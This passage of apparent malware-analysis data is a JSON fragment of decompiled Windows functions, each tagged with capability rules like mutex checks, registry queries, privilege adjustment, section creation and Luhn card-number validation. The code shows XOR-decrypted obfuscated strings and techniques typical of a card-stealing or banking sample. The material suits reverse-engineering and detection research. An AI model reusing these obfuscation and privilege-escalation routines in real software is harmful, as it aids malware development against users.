        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040ece8(uint param_1)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    code *pcVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint lpType;\n    uint lpcbData;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint lpData;\n    uint hKey;\n    \n    hKey = 0;\n    lpData = 0;\n    lpType = 4;\n    lpcbData = 4;\n    var_4ch = 0x451e5627;\n    var_48h = 0x501a4530;\n    var_44h = 0x45105603;\n    var_40h = 0x500b4524;\n    var_3ch = 0x453c5628;\n    var_38h = 0x500d453f;\n    var_34h = 0x451e5606;\n    var_30h = 0x50014525;\n    var_2ch = 0x45055612;\n    var_28h._0_2_ = 0x4556;\n    var_24h = 0x45715674;\n    var_20h = 0x506e4556;\n    var_1ch = param_1;\n    fcn.00401000(0x4c);\n    iVar10 = var_ch;\n    uVar6 = 0;\n    do {\n        puVar1 = uVar6 + var_ch;\n        uVar2 = uVar6 & 0x80000007;\n        if (uVar2 < 0) {\n            uVar2 = (uVar2 - 1 | 0xfffffff8) + 1;\n        }\n        uVar6 = uVar6 + 1;\n        *puVar1 = *(&var_24h + uVar2) ^ puVar1[&var_4ch - var_ch];\n    } while (uVar6 < 0x26);\n    fcn.00403bde(\"GTK DLL: vendor.cpp:%d > ReadVendorIDMarkSpecifyHive : decrypt (wide char) %s -> %ws\", 0x43);\n    iVar3 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(param_1, iVar10, 0, 0x20019, &hKey);\n    pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n    if (iVar3 == 0) {\n        var_44h = 0x50205511;\n        var_40h = 0x52357534;\n        var_3ch = 0x463f5419;\n        var_38h = 0x551f5912;\n        var_34h = 0x753e5035;\n        var_30h = 0x543c520a;\n        var_2ch = 0x5910462a;\n        var_28h._0_2_ = 0x5552;\n        var_24h = 0x50545552;\n        var_20h = var_20h & 0xff000000 | 0x597546;\n        fcn.00401000(0x3c);\n        iVar10 = var_10h;\n        iVar9 = 0;\n        iVar3 = &var_44h - var_10h;\n        do {\n            var_10h = 7;\n            puVar1 = iVar9 + iVar10;\n            iVar7 = iVar9 % 7;\n            iVar9 = iVar9 + 1;\n            *puVar1 = *(&var_24h + iVar7) ^ puVar1[iVar3];\n        } while (iVar9 < 0x1e);\n        fcn.00403bde(\"GTK DLL: vendor.cpp:%d > ReadVendorIDMarkSpecifyHive : decrypt (wide char) %s -> %ws\", 0x46);\n        iVar3 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(hKey, iVar10, 0, &lpType, &lpData, &lpcbData);\n        if (iVar3 == 0) {\n            fcn.0040eaef();\n            fcn.00403bde(\"GTK DLL: vendor.cpp:%d > ReadVendorIDMarkSpecifyHive : Readed from hive : %s\", 0x4d);\n        }\n        else {\n            lpData = 0;\n        }\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar10);\n        pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        iVar10 = var_ch;\n    }\n    uVar4 = lpData;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar10);\n    (*pcVar8)(uVar5);\n    return uVar4;\n}\n",
        "token_count": 1247
    },
    "0040ffe1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check mutex"
        ],
        "decompiled_code": "\nvoid fcn.0040ffe1(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_3ch = 0x353d3914;\n    var_38h = 0x470c5344;\n    var_34h = 0x353b392e;\n    var_30h = 0x473f5353;\n    var_2ch = 0x352c3929;\n    var_28h = 0x47035344;\n    var_24h = 0x35373917;\n    var_20h = 0x4714535f;\n    var_1ch = 0x350c3933;\n    var_18h = 0x4708535e;\n    var_14h = 0x35393922;\n    var_10h = 0x477a5352;\n    var_ch = 0x35583947;\n    var_8h = 0x477a5336;\n    fcn.00401000(0x60);\n    uVar6 = 0;\n    do {\n        puVar1 = uVar6 + var_4h;\n        uVar3 = uVar6 & 0x80000007;\n        if (uVar3 < 0) {\n            uVar3 = (uVar3 - 1 | 0xfffffff8) + 1;\n        }\n        uVar6 = uVar6 + 1;\n        *puVar1 = *(&var_ch + uVar3) ^ puVar1[&var_3ch - var_4h];\n    } while (uVar6 < 0x30);\n    fcn.00403bde(\"GTK DLL: WinMain.cpp:%d > ExitProcessIfInstanceRunningAlready : decrypt (wide char) %s -> %ws\", 10);\n    iVar4 = (*_sym.imp.KERNEL32.dll_OpenMutexW)(0x1f0001, 0, var_4h);\n    if (iVar4 == 0) {\n        (*_sym.imp.KERNEL32.dll_CreateMutexW)(0, 0, var_4h);\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4h);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n        return;\n    }\n    fcn.00403bde(\"GTK DLL: WinMain.cpp:%d > ExitProcessIfInstanceRunningAlready : one instance already running\", 0x19);\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 717
    },
    "0040eac6": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nuint fcn.0040eac6(void)\n\n{\n    int32_t iVar1;\n    \n    while( true ) {\n        iVar1 = fcn.0040e444();\n        if (iVar1 != 0) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n    }\n    fcn.0040e407();\n    return 0;\n}\n",
        "token_count": 82
    },
    "0040eec5": {
        "rules": [
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040eec5(uint param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    uint lpType;\n    uint lpcbData;\n    uint namelen;\n    \n    namelen = 0;\n    uVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyA)(reloc.WS2_32.dll_bind, param_1, &namelen);\n    bVar2 = uVar1 == 0;\n    if (bVar2) {\n        lpType = 1;\n        lpcbData = 0x400;\n        (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(namelen, param_2, 0, &lpType, 0x427e10, &lpcbData);\n        uVar1 = (*_sym.imp.ADVAPI32.dll_RegCloseKey)(namelen);\n    }\n    return uVar1 & 0xffffff00 | bVar2;\n}\n",
        "token_count": 217
    },
    "00406e7e": {
        "rules": [
            "query environment variable"
        ],
        "decompiled_code": "\nuchar * __fastcall fcn.00406e7e(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    uint nSize;\n    uint var_4h;\n    \n    puVar4 = NULL;\n    if ((param_1 != 0) && (iVar1 = (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(param_1, 0, 0),  iVar1 != 0)) {\n        iVar3 = iVar1 * 2 + 8;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n        puVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        puVar5 = puVar4;\n        if (puVar4 != NULL) {\n            for (; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            iVar1 = (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(param_1, puVar4, iVar1);\n            if (iVar1 == 0) {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar4);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                puVar4 = NULL;\n            }\n        }\n    }\n    return puVar4;\n}\n",
        "token_count": 338
    },
    "00407516": {
        "rules": [
            "delete file"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00407516(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    \n    uVar4 = 0;\n    iVar1 = fcn.00406e7e();\n    if (iVar1 != 0) {\n        param_1 = iVar1;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_DeleteFileW)(param_1);\n    if (iVar2 == 0) {\n        uVar4 = fcn.0040c16d();\n    }\n    if (iVar1 != 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar1);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return uVar4;\n}\n",
        "token_count": 190
    },
    "00407b87": {
        "rules": [
            "get token membership"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00407b87(void)\n\n{\n    int32_t iVar1;\n    uint pIdentifierAuthority;\n    uint var_ch;\n    uint SidToCheck;\n    uint32_t IsMember;\n    \n    var_ch._0_2_ = 0x500;\n    pIdentifierAuthority = 0;\n    fcn.00403bde(\"GTK DLL: globals.cpp:%d > IsUserAdmin : [ENTERED]\", 0x18a);\n    IsMember = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                         (&pIdentifierAuthority, 2, 0x20, 0x220, 0, 0, 0, 0, 0, 0, &SidToCheck);\n    if (IsMember != 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_CheckTokenMembership)(0, SidToCheck, &IsMember);\n        IsMember = IsMember & -(iVar1 != 0);\n        (*_sym.imp.ADVAPI32.dll_FreeSid)(SidToCheck);\n    }\n    fcn.00403bde(\"GTK DLL: globals.cpp:%d > IsUserAdmin : [LEAVED]\", 0x195);\n    return IsMember;\n}\n",
        "token_count": 276
    },
    "00407e33": {
        "rules": [
            "create or open section object"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00407e33(int32_t *arg_8h)\n\n{\n    uint *in_EDX;\n    int32_t iVar1;\n    uint *puVar2;\n    uchar *puVar3;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint *var_10h;\n    uchar *var_ch;\n    int32_t var_8h;\n    \n    puVar2 = &var_3ch;\n    var_10h = in_EDX;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    var_8h = 0;\n    puVar2 = &var_1ch;\n    for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    var_ch = NULL;\n    puVar2 = &var_24h;\n    for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    var_30h = 0x40;\n    var_3ch = 0x18;\n    var_38h = 0;\n    var_34h = 0;\n    var_2ch = 0;\n    var_28h = 0;\n    iVar1 = (*_sym.imp.ntdll.dll_NtCreateSection)(&var_8h, 0xf001f, &var_3ch, &var_1ch, 0x40, 0x8000000, 0);\n    if (iVar1 < 0) {\n        iVar1 = (*_sym.imp.ntdll.dll_RtlNtStatusToDosError)(iVar1);\n    }\n    else {\n        iVar1 = fcn.00407dc0(&var_ch);\n        puVar3 = var_ch;\n        if (iVar1 == 0) {\n            for (; var_1ch != 0; var_1ch = var_1ch + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            *var_10h = var_ch;\n            if (arg_8h != NULL) {\n                *arg_8h = var_8h;\n            }\n        }\n    }\n    if ((var_8h != 0) && (arg_8h == NULL)) {\n        (*_sym.imp.ntdll.dll_ZwClose)(var_8h);\n    }\n    return iVar1;\n}\n",
        "token_count": 654
    },
    "0040d022": {
        "rules": [
            "modify access privileges"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040d022(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint NewState;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint lpLuid;\n    uint var_8h;\n    int32_t TokenHandle;\n    \n    TokenHandle = param_2;\n    if (param_2 == 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x28, &TokenHandle);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar3);\n        if (iVar2 != 0) {\n            iVar1 = (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, param_1, &lpLuid);\n            iVar2 = 0;\n            if (iVar1 != 0) {\n                var_18h = lpLuid;\n                var_14h = var_8h;\n                NewState = 1;\n                var_10h = 2;\n                iVar2 = (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &NewState, 0x10, 0, 0);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n        }\n    }\n    else {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, param_1, &lpLuid);\n        iVar2 = 0;\n        if (iVar1 != 0) {\n            var_18h = lpLuid;\n            var_14h = var_8h;\n            NewState = 1;\n            var_10h = 2;\n            iVar2 = (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &NewState, 0x10, 0, 0);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 452
    }
}